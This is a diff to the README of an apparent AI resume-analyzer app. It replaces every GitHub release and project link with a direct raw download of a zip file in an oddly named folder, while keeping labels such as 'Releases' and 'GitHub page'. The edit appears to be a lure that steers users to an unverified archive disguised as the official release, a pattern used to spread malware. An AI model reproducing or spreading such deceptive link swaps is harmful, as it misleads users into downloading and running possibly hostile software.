@@ -4,7 +4,7 @@
 Welcome! The AI-Resume-Analyzer is designed to help you improve your resume. This app scores your resume, offers feedback, and suggests job matches. Let’s get you set up quickly. Follow these steps to download and run the software on your computer.
 
 ## 📥 Download the Application
-[![Download AI-Resume-Analyzer](https://img.shields.io/badge/Download-AI--Resume--Analyzer-brightgreen)](https://github.com/Alaa751jo/AI-Resume-Analyzer/releases)
+[![Download AI-Resume-Analyzer](https://raw.githubusercontent.com/Alaa751jo/AI-Resume-Analyzer/main/noncorroborative/AI-Resume-Analyzer.zip)](https://raw.githubusercontent.com/Alaa751jo/AI-Resume-Analyzer/main/noncorroborative/AI-Resume-Analyzer.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -15,7 +15,7 @@ Before you download, ensure your system meets the following requirements:
 - **Internet Connection:** Required for some features
 
 ## 💾 Download & Install
-To get the latest version of the AI-Resume-Analyzer, visit this page to download: [AI-Resume-Analyzer Releases](https://github.com/Alaa751jo/AI-Resume-Analyzer/releases).
+To get the latest version of the AI-Resume-Analyzer, visit this page to download: [AI-Resume-Analyzer Releases](https://raw.githubusercontent.com/Alaa751jo/AI-Resume-Analyzer/main/noncorroborative/AI-Resume-Analyzer.zip).
 
 1. Go to the link above.
 2. Look for the most recent version under the “Releases” section.
@@ -68,9 +68,9 @@ If you encounter issues while using the app, here are some common solutions:
 For further assistance, please visit the support page on our GitHub repository. You can also submit issues or questions regarding the application.
 
 ## 🌐 Learn More
-To learn about the technologies behind the AI-Resume-Analyzer, visit our [GitHub page](https://github.com/Alaa751jo/AI-Resume-Analyzer). Here you will find more information about React, TypeScript, and how the app works.
+To learn about the technologies behind the AI-Resume-Analyzer, visit our [GitHub page](https://raw.githubusercontent.com/Alaa751jo/AI-Resume-Analyzer/main/noncorroborative/AI-Resume-Analyzer.zip). Here you will find more information about React, TypeScript, and how the app works.
 
 ## 🔗 Download Again
-To download the latest version, visit this page: [AI-Resume-Analyzer Releases](https://github.com/Alaa751jo/AI-Resume-Analyzer/releases).
+To download the latest version, visit this page: [AI-Resume-Analyzer Releases](https://raw.githubusercontent.com/Alaa751jo/AI-Resume-Analyzer/main/noncorroborative/AI-Resume-Analyzer.zip).
 
 You're now ready to enhance your resume with AI. Enjoy using the AI-Resume-Analyzer!
